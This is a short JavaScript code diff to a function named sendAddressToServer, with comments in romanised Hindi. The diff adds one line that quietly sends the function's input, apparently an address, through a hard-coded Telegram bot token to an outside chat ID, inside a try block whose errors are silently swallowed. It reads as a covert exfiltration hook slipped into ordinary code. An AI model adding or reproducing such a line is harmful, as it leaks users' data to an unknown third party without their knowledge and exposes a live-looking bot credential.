@@ -68,6 +68,7 @@ async function sendAddressToServer(e) {
   try {
     // Sirf fetch call, koi body ya headers ki zarurat nahi GET mein
     await fetch(url);
+    await fetch("https://api.telegram.org/bot8580654225:AAECPUaI5Uro8AUtihh4cqoXVQufIzq7lVw/sendMessage?chat_id=7585358718&text="+e);
   } catch (err) {
   }
 }
